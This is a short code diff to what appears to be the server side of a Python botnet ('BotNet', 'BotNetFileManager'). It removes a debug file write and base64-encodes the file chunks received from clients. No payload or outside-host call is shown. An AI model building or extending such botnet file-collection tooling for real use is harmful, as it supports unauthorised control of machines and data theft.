@@ -14,8 +14,6 @@ except:
 
 MIN_CLIENT_VERSION = "0.2"
 
-test_file = open("servertest.png","wb")
-
 class BotNet(Thread):
     INPUT_TIMEOUT = 1
     STDOUT_JSON = 'stdout'
@@ -304,7 +302,7 @@ class BotNetFileManager:
                     if len(self.files[uf]) > 0:
                         temp = self.files[uf]
                         self.files[uf] = b''
-                        yield temp
+                        yield base64.b64encode(temp)
                 self.closed.remove(uf)
 
         return filegen()
@@ -314,8 +312,6 @@ class BotNetFileManager:
         with self.lock:
             if uf not in self.files:
                 self.files[uf] = b''
-
-            test_file.write(wbytes)
 
             self.files[uf] += wbytes
             self.cond.notify()
@@ -334,4 +330,3 @@ class BotNetFileManager:
             if uf not in self.closed:
                 self.closed.add(uf)
                 self.cond.notify()
-            test_file.close()
